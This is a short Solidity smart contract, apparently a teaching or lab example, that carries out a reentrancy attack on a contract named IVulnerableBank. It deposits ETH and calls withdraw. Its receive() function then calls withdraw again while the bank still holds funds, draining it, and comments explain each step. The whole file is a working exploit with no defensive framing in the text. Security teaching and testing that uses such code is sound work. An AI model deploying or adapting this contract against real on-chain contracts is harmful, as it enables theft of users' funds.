// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerableBank public immutable bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH");

        // Establish our balance in the vulnerable bank.
        bank.deposit{value: msg.value}();

        // Start the withdrawal. The bank will call our receive()
        // function before resetting our balance.
        bank.withdraw();
    }

    receive() external payable {
        attackCount++;

        // Re-enter while the bank still thinks we have a balance.
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}